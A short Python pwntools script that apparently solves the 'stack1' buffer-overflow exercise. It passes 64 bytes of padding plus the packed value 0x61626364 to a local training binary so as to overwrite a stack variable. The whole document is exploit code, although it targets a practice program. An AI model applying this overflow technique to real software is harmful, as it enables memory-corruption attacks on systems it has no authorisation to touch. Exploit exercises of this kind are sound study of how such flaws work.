from pwn import *
import struct

context.log_level = 'error'

PADDING = 'A'* (16*4)
MODIFIED = str(struct.pack('I', 0x61626364).decode('ascii'))

p = process(['./stack1', PADDING + MODIFIED])

print(p.recvline().decode('ascii'))
